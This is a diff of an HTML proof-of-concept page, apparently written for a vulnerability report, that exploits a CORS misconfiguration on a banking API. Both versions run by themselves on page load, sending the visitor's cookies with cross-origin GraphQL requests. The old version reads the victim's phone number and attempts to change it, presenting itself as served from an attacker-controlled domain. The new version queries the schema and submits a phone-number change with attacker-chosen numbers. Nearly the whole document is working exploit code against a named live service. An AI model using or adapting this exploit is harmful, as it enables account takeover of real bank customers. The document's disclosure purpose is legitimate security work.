@@ -1,105 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
 <meta charset="utf-8">
-<title>S Banking – Critical CORS PoC</title>
+<title>Swan CORS Critical PoC</title>
 <style>
- body{font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;margin:2rem;max-width:900px}
- h1{font-size:1.6rem}
- #phone{font-weight:bold}
- pre{background:#111;color:#0f0;padding:1rem;border-radius:6px;overflow:auto;font-size:.9rem}
- .err{color:#c00;font-weight:bold}
+ body{font-family:system-ui;margin:2rem;color:#111}
+ pre{background:#f8f8f8;padding:1rem;border:1px solid #e1e1e1;overflow:auto}
+ .good{color:green}.bad{color:#c00}
 </style>
-</head>
-<body>
-<h1>⚠️ S Banking – Critical CORS Misconfiguration PoC ⚠️</h1>
 
-<p>This page is served from <strong>snowgoose.info</strong> (attacker-controlled).  
-If the browser already contains valid <code>api.swan.io</code> cookies, the
-cross-origin requests below run <em>automatically</em> – no click, no JWT, no
-<code>X-Swan-Authenticator-Token</code>.</p>
+<h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
+<p>This page is served from <strong><span id="origin"></span></strong>.
+If your browser already holds <code>api.swan.io</code> cookies, the
+cross-origin requests below <em>automatically</em> include them – no JWT,
+no X-Swan-Authenticator-Token – because the server reflects every
+<code>Origin</code> and sets
+<code>Access-Control-Allow-Credentials: true</code>.</p>
 
-<h2>Victim’s current mobile phone number</h2>
-<p id="phone">⏳ collecting…</p>
-
-<h2>Live request / response log</h2>
-<pre id="log">Initialising…</pre>
+<h3>Results</h3>
+<pre id="log">Running…</pre>
 
 <script>
-/* ─────────────────────────────────────────────────────────────── */
-/* Utility – send GraphQL and pretty-print the response           */
-/* ─────────────────────────────────────────────────────────────── */
-async function gql(endpoint, query, log) {
-  const res  = await fetch(endpoint, {
-    method: 'POST',
-    credentials: 'include',            // send Swan cookies
-    mode: 'cors',
-    headers: {
-      'Content-Type':'application/json',
-      'Origin':'https://evil.com'      // Swan trusts this origin
-    },
-    body: JSON.stringify({query})
-  });
+const log = s => (document.getElementById('log').textContent += s + '\n');
+document.getElementById('origin').textContent = location.origin;
 
-  const txt  = await res.text();
-  log.innerText +=
-`=== ${endpoint.replace('https://','')} ===
-HTTP ${res.status}
-access-control-allow-origin: ${res.headers.get('access-control-allow-origin')}
-access-control-allow-credentials: ${res.headers.get('access-control-allow-credentials')}
-${txt}
+// 1) Introspection
+fetch("https://api.swan.io/admin/graphql", {
+  method:"POST",
+  credentials:"include",
+  headers:{ "Content-Type":"application/json" },
+  body: JSON.stringify({query:`{ __schema { queryType { name } } }`})
+})
+.then(r => r.text().then(b => log(`=== /admin/graphql ===\nStatus: ${r.status} ${r.statusText}\n${b}\n`)));
 
-`;
-  return {ok:res.ok, json:JSON.parse(txt)};
-}
-
-/* ─────────────────────────────────────────────────────────────── */
-/* Main exploit – auto-executes                                   */
-/* ─────────────────────────────────────────────────────────────── */
-(async ()=>{
-  const logEl   = document.getElementById('log');
-  logEl.innerText='';
-
-  const API='https://api.swan.io/admin-auth/graphql';
-
-  /* 1️⃣  READ victim data */
-  const qUser=`query{ user{ mobilePhoneNumber } }`;
-  const user = await gql(API,qUser,logEl);
-
-  const phoneEl=document.getElementById('phone');
-  let currentNumber;
-  try{
-     currentNumber=user.json.data.user.mobilePhoneNumber;
-     phoneEl.textContent=`📱 ${currentNumber}`;
-  }catch(e){
-     phoneEl.innerHTML='<span class="err">❌ No Swan cookie – log in once then refresh</span>';
-     return;
+// 2) startPhoneNumberModification (attacker-chosen numbers)
+const oldN = "+33600000002", newN = "+33677777777";
+const mutation = `
+mutation {
+  startPhoneNumberModification(input:{
+    oldPhoneNumber:"${oldN}",
+    newPhoneNumber:"${newN}"
+  }) {
+    __typename
+    ... on StartPhoneNumberModificationSuccessPayload {
+      phoneNumberModification { id }
+    }
+    ... on PhoneNumberModificationAlreadyExistsRejection { message }
+    ... on TooManyPhoneNumberModificationRejection { message }
   }
-
-  /* 2️⃣  WRITE – attempt to change number each visit */
-  const randomLast4 = Math.floor(Math.random()*9000+1000);            // 1000-9999
-  const newNumber   = `+3361234${randomLast4}`;
-
-  const mutation=`
-    mutation{
-      startPhoneNumberModification(input:{
-        oldPhoneNumber:"${currentNumber}",
-        newPhoneNumber:"${newNumber}"
-      }){
-        __typename
-        ... on StartPhoneNumberModificationSuccessPayload{
-          phoneNumberModification{ id }
-        }
-        ... on PhoneNumberModificationAlreadyExistsRejection{
-          message
-        }
-      }
-    }`;
-
-  await gql(API,mutation,logEl);
-
-  logEl.innerText += `[+] New number attempted: ${newNumber}\n`;
-})();
+}`;
+fetch("https://api.swan.io/admin-auth/graphql", {
+  method:"POST",
+  credentials:"include",
+  headers:{ "Content-Type":"application/json" },
+  body: JSON.stringify({query:mutation})
+})
+.then(r => r.text().then(b => log(`=== /admin-auth/graphql ===\nStatus: ${r.status} ${r.statusText}\n${b}\n\n[+] Attempted new number: ${newN}`)))
+.catch(e => log(`Fetch error: ${e}`));
 </script>
-</body>
-</html>
